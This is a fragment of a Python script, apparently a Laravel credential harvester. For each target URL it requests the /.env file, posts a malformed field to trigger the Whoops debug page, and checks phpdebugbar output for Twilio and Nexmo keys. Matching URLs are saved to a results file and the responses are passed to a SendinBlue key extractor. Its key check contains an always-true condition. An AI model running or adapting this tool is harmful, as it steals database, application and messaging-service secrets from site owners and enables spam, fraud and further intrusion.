...
def main(ul):
	...
	try:
		url = requests.get(ul,headers=headers).url
		#url = r.url
		text = '\033[32;1m#\033[0m '+url
		get_souce = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False)
		...
		if 'APP_NAME=' in get_source or 'APP_KEY=' in get_source or 'DB_HOST=' in get_source or get_souce.status_code == 200:
			...
			get_source = requests.post(url, data={"0x[]":"easy"}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
			if '<td>APP_NAME</td>' in get_source or 'Whoops! There was an error.' in get_source:
			   resp = get_source
			else:
			 get_source1 = requests.get(url,headers=headers, timeout=5, verify=False, allow_redirects=False).text
			 if "AjaxHandler(phpdebugbar, undefined, true)" in get_source1:
			  if '"twilio_sid"' or '"twilio_account_sid"' or '"nexmo_key"' or '"nexmo_apikey"' or '"nexmo_api_key"' in get_source1:
			   text += ' | \033[32;1mOTHER\033[0m'
			   simpan = open('Results/other.txt', 'a')
			   simpan.write(url+'\n')
			   simpan.close()
			 else:
			  text += ' | \033[31;1mOTHER\033[0m'
		if resp:
			...
			getsendinblue = easy().get_sendinblue(resp, url)
